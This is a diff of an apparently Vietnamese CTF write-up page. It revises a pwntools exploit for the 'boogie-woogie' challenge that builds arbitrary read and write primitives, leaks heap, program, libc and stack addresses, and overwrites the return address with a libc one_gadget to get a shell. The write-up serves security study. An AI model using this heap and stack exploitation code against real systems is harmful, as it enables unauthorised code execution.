@@ -348,6 +348,7 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
 </span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./boogie-woogie_patched&#34;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(<span style="color:#e6db74">&#39;./boogie-woogie_patched&#39;</span>)
@@ -355,27 +356,30 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">1337</span>)
 </span></span><span style="display:flex;"><span>        
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap_str</span>(num1, num2):
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, num1<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> num2<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(num1<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> num2<span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap</span>(v1,v2):
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, (str(v1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(v2))<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline((str(v1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(v2))<span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aar</span>(addr):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
-</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>        clap(addr<span style="color:#f92672">+</span>i, <span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
 </span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
-</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
 </span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
-</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ptr
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aaw</span>(addr1, addr2, len):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len):
+</span></span><span style="display:flex;"><span>        clap(addr1<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>], addr2<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>])
+</span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_heap_offset</span>():
 </span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruting&#39;</span>) <span style="color:#66d9ef">as</span> p:
@@ -398,35 +402,69 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io, heap_page <span style="color:#f92672">=</span> brute_heap_offset()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>__dso_handle <span style="color:#f92672">=</span> leak_relative_ptr(<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>)
+</span></span><span style="display:flex;"><span>__dso_handle <span style="color:#f92672">=</span> aar(<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>)
 </span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>  __dso_handle <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__dso_handle&#39;</span>]
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;__dso_handle = </span><span style="color:#e6db74">{</span>hex(__dso_handle)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;program base = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to a heap page = </span><span style="color:#e6db74">{</span>hex(heap_page)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>maybe_tcache_perthread <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie &#39;</span> <span style="color:#f92672">+</span> hex(elf<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tcache_perthread_struct <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>maybe_tcache_perthread<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>tcache_perthread_struct<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">&#39;</span>:
-</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
-</span></span><span style="display:flex;"><span>    maybe_tcache_perthread <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>    tcache_perthread_struct <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span>
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> maybe_tcache_perthread <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to heap base = </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ab8</span>
+</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> tcache_perthread_struct <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ab8</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap &#39;</span> <span style="color:#f92672">+</span> hex(heap))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;top_chunk &#39;</span> <span style="color:#f92672">+</span> hex(top_chunk))
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-3 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1 -&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x800</span>)
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># cmd = &#34;&#34;&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># init-pwndbg</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># b* main+199</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;&#34;&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, cmd)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> aar(top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">6</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc &#39;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>og_offset <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x50a47</span>, <span style="color:#ae81ff">0xebc81</span>, <span style="color:#ae81ff">0xebc88</span>, <span style="color:#ae81ff">0xebc85</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stack <span style="color:#f92672">=</span> aar(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__environ <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;data&#39;</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
+</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>
+</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> ret<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;stack &#39;</span> <span style="color:#f92672">+</span> hex(stack))
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;ret &#39;</span> <span style="color:#f92672">+</span> hex(ret))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;libc_bss&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> bytearray(f<span style="color:#f92672">.</span>read())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Overwrite rbp with stack address in libc_environ</span>
+</span></span><span style="display:flex;"><span>aaw(rbp, libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__environ, <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_byte</span>(addr, nth):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ((addr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>nth) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)<span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>og <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> og_offset[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">0</span>)), ret)
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">1</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>aaw(libc<span style="color:#f92672">.</span>bss()<span style="color:#f92672">+</span>data<span style="color:#f92672">.</span>find(get_byte(og, <span style="color:#ae81ff">2</span>)), ret<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><h1 id="mics---zshfuck">Mics - zshfuck</h1>
+</span></span></code></pre></div><p>Ở bài này, có khá nhiều cách khi</p>
+<h1 id="mics---zshfuck">Mics - zshfuck</h1>
 <h2 id="source-code-overview-2">Source code overview</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/zsh
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>print -n -P <span style="color:#e6db74">&#34;%F{green}Specify your charset: %f&#34;</span>
